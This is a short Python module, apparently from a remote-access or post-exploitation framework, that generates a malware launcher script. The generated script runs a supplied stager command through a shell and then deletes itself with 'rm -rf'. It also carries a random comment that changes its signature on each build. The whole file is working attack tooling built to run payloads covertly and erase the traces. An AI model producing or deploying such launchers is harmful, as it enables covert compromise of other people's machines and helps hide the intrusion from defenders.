from helpers import *


class Launcher:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Creates a python file launcher.",
            "References": [],
        }

    def generate(self, stager):
        return ("py", """\
        #!/usr/bin/env python
        # -*- coding: utf-8 -*-
        # %s
        import subprocess

        subprocess.Popen("%s", shell=True)
        subprocess.Popen("rm -rf " + __file__, shell=True)
        """ % (random_string(numbers=True), stager.replace('"', '\\"')))
